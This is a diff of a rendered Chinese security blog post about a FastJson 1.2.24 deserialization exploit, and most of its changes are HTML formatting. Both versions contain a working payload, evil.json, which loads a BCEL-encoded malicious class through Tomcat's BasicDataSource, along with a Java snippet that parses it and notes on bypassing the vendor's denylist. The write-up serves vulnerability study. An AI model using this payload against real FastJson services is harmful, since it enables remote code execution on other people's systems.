$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\&quot;\n&quot; +</span><br><span class="line">//                &quot;\t\t&#125;\n&quot;;</span><br><span class="line">        StringBuffer Buffer = new StringBuffer();</span><br><span class="line">        FastJsonPwn.readToBuffer(Buffer,&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.json&quot;);</span><br><span class="line">        Object obj= JSON.parseObject(Buffer.toString());</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>evil.json</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</div><div class="line">  &quot;driverClassLoader&quot; :</div><div class="line">  &#123;</div><div class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</div><div class="line">  &#125;,</div><div class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">  &quot;driverClassLoader&quot; :</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="/2018/06/18/FastJson反序列化漏洞(续)/pwn.png" alt=""><br>其它可能用到的代码已经放到<a href="https://github.com/kevien/javacode" target="_blank" rel="external">github</a></p>
+<p><img src="/2018/06/18/FastJson反序列化漏洞(续)/pwn.png" alt=""><br>其它可能用到的代码已经放到<a href="https://github.com/kevien/javacode" target="_blank" rel="noopener">github</a></p>
 <h4 id="about-patch"><a href="#about-patch" class="headerlink" title="about patch"></a>about patch</h4><ul>
-<li>笔者进行漏洞测试的版本是1.2.24，在17年12月11号，fastjson维护者更新了一段代码<a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="external">github</a><br><img src="/2018/06/18/FastJson反序列化漏洞(续)/denylist.png" alt=""></li>
+<li>笔者进行漏洞测试的版本是1.2.24，在17年12月11号，fastjson维护者更新了一段代码<a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="noopener">github</a><br><img src="/2018/06/18/FastJson反序列化漏洞(续)/denylist.png" alt=""></li>
 <li>作者将原来的denyList改为denyHashCodes的方式进行黑名单拦截（最新版本依然采用这种方式），其中denyHashCode的计算方式略微复杂，增加了攻击门槛。<br><img src="/2018/06/18/FastJson反序列化漏洞(续)/calculatehash.png" alt=""><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li>
 <li>较Template攻击方式此攻击方式不需要设置Feature.SupportNonPublicField，但是需要外部的jar包（因为这个jar包和JDBC数据库连接相关，可能很多项目应该都使用了，所以影响也还是很大）。</li>
 <li>利用 defineClass 在运行时状态下，将我们精心构造的 class 文件加载进入 ClassLoader，通过<br>java 的 static{}特征，导致代码执行。</li>
 <li>此payload较之前的有个好处就是不需要受害者开启Feature.SupportNonPublicField这个‘特性‘。</li>
 <li>根据作者之前通过的denylist其实就可以知道这个漏洞的利用方式很多种，和python类似，java很多漏洞都还是绕denyList的问题。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
-<li><a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a></li>
-<li><a href="https://threathunter.org/topic/5a49570eec721b1f1966f30f" target="_blank" rel="external">Evading Anti-Virus by using dynamic code generation and reflection</a></li>
+<li><a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="noopener">DefineClass在Java反序列化当中的利用</a></li>
+<li><a href="https://threathunter.org/topic/5a49570eec721b1f1966f30f" target="_blank" rel="noopener">Evading Anti-Virus by using dynamic code generation and reflection</a></li>
 </ul>
 
       
@@ -495,8 +494,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/15/python虚拟环境安装和使用/" rel="next" title="python虚拟环境安装和使用">
-                <i class="fa fa-chevron-left"></i> python虚拟环境安装和使用
+              <a href="/2018/04/07/格式化字符串漏洞/" rel="next" title="格式化字符串漏洞">
+                <i class="fa fa-chevron-left"></i> 格式化字符串漏洞
               </a>
             
           </div>
@@ -505,8 +504,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/04/07/格式化字符串漏洞/" rel="prev" title="格式化字符串漏洞">
-                格式化字符串漏洞 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/07/15/python虚拟环境安装和使用/" rel="prev" title="python虚拟环境安装和使用">
+                python虚拟环境安装和使用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -555,7 +554,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -565,10 +564,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -695,7 +692,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
